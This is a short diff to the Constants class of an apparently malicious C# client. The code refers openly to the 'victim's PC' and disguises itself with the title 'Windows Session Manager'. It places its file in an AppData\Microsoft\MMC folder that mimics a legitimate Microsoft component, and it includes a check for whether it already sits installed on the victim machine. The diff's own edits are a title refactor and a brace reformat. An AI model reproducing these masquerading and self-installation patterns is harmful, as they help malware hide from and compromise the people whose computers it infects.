@@ -15,7 +15,7 @@ namespace Client
     /// </summary>
     public static class Constants
     {
-        public static string Title = "Windows Session Manager";
+        public static string Title = Assembly.GetExecutingAssembly().GetCustomAttribute<AssemblyTitleAttribute>().Title;
         public static string AppDataFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
 
         public static string MMCFolder = System.IO.Path.GetFullPath(AppDataFolder + @"\Microsoft\MMC");
@@ -31,7 +31,8 @@ namespace Client
         /// <summary>
         /// Checks if the current program is already in the victim's PC via path.
         /// </summary>
-        public static bool IsInVictimPC() {
+        public static bool IsInVictimPC()
+        {
             return Utilities.Filepath.NormalizePath(MyPath) == Utilities.Filepath.NormalizePath(MMCFile);
         }
 
